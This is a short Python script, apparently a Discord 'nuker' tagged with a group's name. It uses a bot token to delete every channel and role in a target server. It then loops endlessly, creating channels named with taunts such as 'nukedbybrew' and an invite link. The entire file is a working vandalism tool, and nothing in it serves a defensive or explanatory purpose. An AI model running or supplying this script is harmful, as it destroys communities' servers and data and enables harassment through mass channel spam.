"""
    @brewruin.py
*      example code
    brewsoftworks.lol
"""
import os, sys, requests, json, random
Token = "bot token"
Guild = "1157056342687764510"
AuthHeaders = {"Authorization": "Bot "+Token}

Quotes = ["brewontop", "nukedbybrew", "brewsoftworks.lol", ".gg/xEYF2eEcf", "dex4tw-ontop", "dexownsu"]

channels=requests.get(f'https://discord.com/api/v10/guilds/{Guild}/channels', headers=AuthHeaders).json()
roles=requests.get(f'https://discord.com/api/v10/guilds/{Guild}/roles', headers=AuthHeaders).json()

for channel in channels:
    try:
        savedata = channel
        requests.delete("https://discord.com/api/v9/channels/"+channel['id'], headers=AuthHeaders)
        print(":: Deleted "+savedata['name'])
    except Exception as e:
        print(f"!! Could not delete {channel['name']}\n"+e)
for role in roles:
    try:
        savedata = role
        requests.delete(f"https://discord.com/api/v9/guilds/{Guild}/roles/"+role['id'], headers=AuthHeaders)
        print(":: Deleted "+savedata['name'])
    except Exception as e:
        print(f"!! Could not delete {role['name']}\n"+e)
while True:
    create = requests.post(f"https://discord.com/api/v9/guilds/{Guild}/channels", json={"name": random.choice(Quotes)}, headers=AuthHeaders)
    if create.status_code == 200 or create.status_code == 203 or create.status_code == 201:
        print(":: Channel created '"+create.json()['name']+"'")
    else:
        print("!! Could not create channel.")